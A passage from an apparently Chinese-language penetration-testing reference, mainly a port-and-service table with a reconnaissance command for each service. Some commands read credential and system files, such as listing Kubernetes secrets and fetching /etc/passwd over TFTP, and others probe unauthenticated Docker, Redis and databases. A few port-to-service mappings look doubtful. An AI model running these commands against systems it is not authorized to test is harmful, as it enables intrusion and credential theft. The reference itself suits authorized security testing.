curl -sk https://target.com:6443/api/v1/namespaces/default/secrets

# Dashboard 默认端口 30000-32767
curl -s http://target.com:30000/api/v1/pod
```

---

## 12. 常见端口与服务速查

### 完整端口服务表

| 端口 | 协议 | 服务 | 常见漏洞 | 测试命令 |
|------|------|------|---------|---------|
| 20/21 | TCP | FTP | 匿名登录, 弱口令 | `nmap --script ftp-anon,ftp-bounce` |
| 22 | TCP | SSH | 弱口令, 版本漏洞 | `nmap --script ssh2-enum-algos` |
| 23 | TCP | Telnet | 明文传输 | `nmap --script telnet-encryption` |
| 25 | TCP | SMTP | 邮件中继, 用户枚举 | `nmap --script smtp-commands,smtp-enum-users` |
| 53 | UDP/TCP | DNS | 区域传输 | `dig axfr @target.com` |
| 69 | UDP | TFTP | 任意文件读取 | `tftp <target> GET /etc/passwd` |
| 79 | TCP | Finger | 用户枚举 | `finger @target.com` |
| 80 | TCP | HTTP | Web 漏洞 | `whatweb` `dirsearch` |
| 88 | TCP | Kerberos | 黄金票据 | `nmap --script krb5-enum-users` |
| 110 | TCP | POP3 | 弱口令 | `nmap --script pop3-capabilities` |
| 111 | TCP | RPC | RPC 服务枚举 | `rpcclient -U "" target.com` |
| 135 | TCP | MSRPC | MSRPC 枚举 | `nmap --script msrpc-enum` |
| 137/139 | TCP | NetBIOS | NetBIOS 枚举 | `nmap --script nbstat` |
| 143 | TCP | IMAP | 弱口令 | `nmap --script imap-capabilities` |
| 161 | UDP | SNMP | 公共字符串 | `snmpwalk -v2c -c public target.com` |
| 389 | TCP | LDAP | 匿名绑定 | `ldapsearch -x -h target.com` |
| 443 | TCP | HTTPS | Web 漏洞 | `nmap --script ssl-*` |
| 445 | TCP | SMB | EternalBlue | `nmap --script smb-vuln-*` |
| 465 | TCP | SMTPS | 弱口令 | `nmap --script smtp-*` |
| 500 | UDP | IKE | VPN 扫描 | `ike-scan target.com` |
| 502 | TCP | Modbus | SCADA | `nmap --script modbus-*` |
| 587 | TCP | SMTP | 邮件中继 | `nmap --script smtp-commands` |
| 593 | TCP | MSRPC | MSRPC over HTTP | `nmap --script msrpc-enum` |
| 636 | TCP | LDAPS | LDAP 注入 | `ldapsearch -x -H ldaps://target.com` |
| 873 | TCP | Rsync | 匿名访问 | `rsync target.com::` |
| 993 | TCP | IMAPS | 弱口令 | `nmap --script imap-capabilities` |
| 995 | TCP | POP3S | 弱口令 | `nmap --script pop3-*` |
| 1080 | TCP | SOCKS | 开放代理 | `curl -x socks5://target.com:1080 http://ifconfig.me` |
| 1099 | TCP | Java RMI | 反序列化 | `nmap --script rmi-*` |
| 1433 | TCP | MSSQL | 弱口令, SA 提权 | `nmap --script ms-sql-*` |
| 1521 | TCP | Oracle | 弱口令 | `nmap --script oracle-*` |
| 1701 | UDP | L2TP | VPN 扫描 | `nmap --script pptp-*` |
| 1723 | TCP | PPTP | VPN 扫描 | `nmap --script pptp-*` |
| 1883 | TCP | MQTT | 无认证 | `mosquitto_sub -h target.com -t "#"` |
| 2049 | TCP | NFS | 无限制挂载 | `showmount -e target.com` |
| 2100 | TCP | Oracle | TNS 注入 | `nmap --script oracle-tns-version` |
| 2375 | TCP | Docker API | 未授权 | `docker -H tcp://target.com:2375 info` |
| 2376 | TCP | Docker TLS | TLS 配置 | `curl -sk https://target.com:2376/version` |
| 2483 | TCP | Oracle | 弱口令 | `nmap --script oracle-brute` |
| 2628 | TCP | Dict | 协议漏洞 | `nmap --script dict-*` |
| 3000 | TCP | Node/Grafana | 默认配置 | `curl http://target.com:3000` |
| 3128 | TCP | Squid | 开放代理 | `curl -x http://target.com:3128 http://ifconfig.me` |
| 3306 | TCP | MySQL | 弱口令 | `nmap --script mysql-*` |
| 3389 | TCP | RDP | BlueKeep | `nmap --script rdp-*` |
| 3632 | TCP | DistCC | RCE | `nmap --script distcc-cve2004-2687` |
| 3690 | TCP | SVN | 匿名访问 | `svn list http://target.com:3690/repo` |
| 4369 | TCP | Erlang Port Mapper | 分布式节点 | `nmap --script epmd-info` |
| 4444 | TCP | Metasploit | 默认端口 | 检查框架监听 |
| 4489 | TCP | 各种服务 | 未知 | `nmap -sV -p 4489` |
| 4786 | TCP | Smart Install | Cisco 设备 | `nmap --script cisco-smart-install` |
| 4848 | TCP | GlassFish | 默认凭据 | `curl http://target.com:4848` |
| 5000 | TCP | Docker Registry | 未授权 | `curl http://target.com:5000/v2/_catalog` |
| 5432 | TCP | PostgreSQL | 弱口令 | `nmap --script pgsql-*` |
| 5555 | TCP | Android | ADB 调试 | `adb connect target.com` |
| 5601 | TCP | Kibana | 未授权 | `curl http://target.com:5601` |
| 5672 | TCP | RabbitMQ | 默认凭证 | `curl http://target.com:5672` |
| 5900 | TCP | VNC | 无口令 | `nmap --script vnc-*` |
| 5985 | TCP | WinRM | 远程管理 | `nmap --script winrm-*` |
| 5986 | TCP | WinRM HTTPS | 远程管理 | `crackmapexec winrm target.com -u user -p pass` |
| 6000 | TCP | X11 | 无认证 | `nmap --script x11-access` |
| 6379 | TCP | Redis | 未授权 | `redis-cli -h target.com info` |
| 6443 | TCP | K8s API | 未授权 | `curl -sk https://target.com:6443/api/v1/pods` |
| 7001 | TCP | WebLogic | 反序列化 | `nmap --script weblogic-*` |
| 8069 | TCP | Odoo | 默认访问 | `curl http://target.com:8069` |
| 8080 | TCP | HTTP Proxy | 开放代理 | `nmap --script http-open-proxy` |
| 8086 | TCP | InfluxDB | 未授权 | `curl http://target.com:8086/ping` |
| 8123 | TCP | MySQL | 端口别名 | `nmap -sV -p 8123` |
| 8443 | TCP | HTTPS Alt | Web 漏洞 | `nmap --script ssl-* -p 8443` |
| 8686 | TCP | JMX | 远程调用 | `nmap --script jmx-*` |
| 9000 | TCP | SonarQube | 默认凭据 | `curl http://target.com:9000` |
| 9042 | TCP | Cassandra | 默认凭据 | `cqlsh target.com 9042` |
| 9090 | TCP | WebLogic | 反序列化 | `nmap --script weblogic-*` |
| 9092 | TCP | Kafka | 未授权 | 使用 kafkacat |
| 9160 | TCP | Cassandra | 无认证 | `nmap --script cassandra-*` |
| 9200 | TCP | Elasticsearch | 未授权 | `curl http://target.com:9200/_cat/indices` |
| 9300 | TCP | Elasticsearch | 集群未授权 | `curl http://target.com:9300` |
| 9418 | TCP | Git | 未授权 | `git clone git://target.com/repo` |
| 9999 | TCP | Apache Spark | 未授权 | `curl http://target.com:9999` |
| 10000 | TCP | Webmin | 默认凭据 | `curl http://target.com:10000` |
| 11211 | UDP | Memcached | 未授权 | `nmap --script memcached-*` |
| 27017 | TCP | MongoDB | 未授权 | `nmap --script mongodb-*` |
| 27018 | TCP | MongoDB | 分片 | `nmap --script mongodb-*` |
| 28017 | TCP | MongoDB HTTP | 状态页 | `curl http://target.com:28017` |
| 30707 | TCP | Lotus Domino | 默认访问 | 检查控制台 |
| 32764 | TCP | 路由器后门 | 多家厂商 | 检查 `POST /cgi-bin/` |
| 44818 | UDP | EtherNet/IP | 工控协议 | `nmap --script enip-*` |
| 47808 | UDP | BACNet | 楼宇自动化 | `nmap --script bacnet-*` |
| 49152+ | TCP | Windows RPC | 动态分配 | `nmap --script msrpc-enum` |

---

> **最后更新**: 2026-05-28 | **版本**: 2.1.0
> **免责声明**: 本文档仅用于授权的安全测试和学术研究。所有技术内容应在获得明确授权后使用。
